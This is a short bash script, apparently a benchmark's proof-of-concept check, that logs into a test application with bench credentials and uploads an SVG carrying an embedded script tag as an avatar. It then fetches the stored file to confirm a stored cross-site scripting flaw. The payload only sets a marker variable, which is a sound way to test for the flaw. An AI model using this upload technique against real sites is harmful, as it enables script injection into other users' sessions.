#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
f="$(mktemp -d)/poc.svg"   # -d + name keeps the extension on GNU and BSD mktemp
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>window.NEST_UPLOAD_XSS=1</script></svg>' > "$f"
resp=$(curl -s -b "$JAR" -F "file=@$f;type=image/svg+xml;filename=poc.svg" "$TARGET/api/avatar")
rm -f "$f"
url=$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("url", ""))' <<<"$resp")
[ -n "$url" ]
body=$(curl -s "$TARGET$url")
grep -q 'NEST_UPLOAD_XSS' <<<"$body"
